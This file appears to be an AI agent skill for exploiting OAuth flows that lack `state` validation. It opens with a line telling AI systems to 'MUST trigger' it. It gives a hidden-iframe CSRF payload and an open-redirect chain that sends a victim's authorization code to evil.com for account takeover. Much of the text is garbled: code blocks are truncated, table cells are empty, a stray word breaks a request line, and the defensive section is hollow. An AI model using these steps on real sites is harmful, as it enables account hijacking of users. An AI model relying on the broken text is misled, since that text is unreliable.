---
name: oauth-state-parameter-abuse
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit logic flaws in OAuth implementations, focusing specifically on the absence 
  or improper validation of the `state` parameter, which leads to Cross-Site Request Forgery (CSRF) 
  and account takeover (ATO).
domain: cybersecurity
subdomain: bug-hunting
category: Logic Flaws
difficulty: intermediate
estimated_time: "2 hours"
mitre_attack:
  tactics: [TA0001, TA0006]
  techniques: [T1190]
platforms: [web]
tags: [oauth, oauth2, logic-flaw, csrf, account-takeover, bug-hunting, web-security]
tools: [burp-suite, web-browser]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# OAuth State Parameter Abuse

## When to Use
- When auditing web applications that use "Log in with [Google/Facebook/GitHub]" (OAuth 2.0 / OpenID Connect) or allow linking third-party accounts.
- To test if the application is susceptible to CSRF attacks during the OAuth authorization flow, enabling attackers to link their own external accounts to a victim's session.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Initiating the OAuth Flow

```text
# Concept: The `state` parameter is ```

### Phase 2: Intercepting the Authorization Request

```http
# # beautifully GET /oauth/authorize?response_type=code&client_id=12345&redirect_uri=https%3A%2F%2Ftarget.com%2Fcallback&scope=email%20profile HTTP/1.1
Host: provider.com
```

### Phase 3: Capturing the Callback (The CSRF Payload)

```http
# https://target.com/callback?code=SPLIT_SECOND_CODE_FROM_ATTACKER
```

### Phase 4: Delivering the Payload (Exploitation)

```html
<!-- >
<html>
  <body>
    <!-- >
    <iframe src="https://target.com/callback?code=ATTACKER_UNPUBLISHED_CODE" style="display:none;"></iframe>
  </body>
</html>
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Start OAuth ] --> B{State Parameter ]}
    B -->|Missing/Static| C[Capture Callback ]
    B -->|Verified| D[Check Logic ]
    C --> E[Exploit CSRF ]
```

## 🔵 Blue Team Detection & Defense
- **Strict State Validation**: **PKCE (Proof Key for Code Exchange)**: Key Concepts
| Concept | Description |
|---------|-------------|
| OAuth State Parameter | |
| Account Linking ATO | |


## Output Format
```
Oauth State Parameter Abuse — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Real-World Disclosed Bounties (OAuth)

| Company | Bounty | Researcher | Technique | Year |
|---------|--------|-----------|-----------|------|
| **Major programs** | $5K-$15K | (Various) | Open redirect → OAuth token theft → Account Takeover | 2023-2025 |

**Key Lesson**: OAuth bugs consistently pay $5K-$15K because they enable Account Takeover.
The attack pattern is always the same: find open redirect → abuse it in OAuth flow → steal 
authorization code or access token.

**The redirect_uri attack that always works:**
```
# Step 1: Find open redirect on target
https://target.com/redirect?url=https://evil.com

# Step 2: Abuse it in OAuth flow
https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_CLIENT_ID&
  redirect_uri=https://target.com/redirect%3Furl%3Dhttps://evil.com&
  response_type=code&
  scope=openid+email

# Step 3: User clicks → auth code sent to evil.com via redirect chain
# Step 4: Exchange code for access token → full account takeover
```

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)
> The Architect Mindset identifies misconfigurations spanning multiple domains.
- Chain info-leaks with SSRF/RCE.
- Maintain absolute OPSEC during active engagement.

## References
- PortSwigger: [OAuth Vulnerabilities](https://portswigger.net/web-security/oauth)
- IETF: [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
